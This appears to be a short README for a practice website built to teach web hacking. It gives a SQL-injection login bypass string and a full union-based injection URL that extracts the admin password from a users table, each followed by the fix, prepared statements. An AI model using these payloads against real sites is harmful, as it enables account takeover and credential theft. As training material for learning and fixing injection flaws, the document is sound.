A website where you can learn hacking website and practice your skill such as :
- sql injection
- xss

Bug 1: Subverting application logic
- You can login any account by just typing: "username' -- "
- fix: Prepared Statements

Bug 2: union base injection:
- Injection code: https://vantechlablearnhacking.id.vn/profile.php?name=DaviVan%27%20union%20select%20%27null%27,%27null%27,password,%27null%27,%27null%27,%27null%27,username%20from%20users%20where%20username=%27admin%27%20--%20

- result:
![alt text](image.png)

- fix: prepared statement
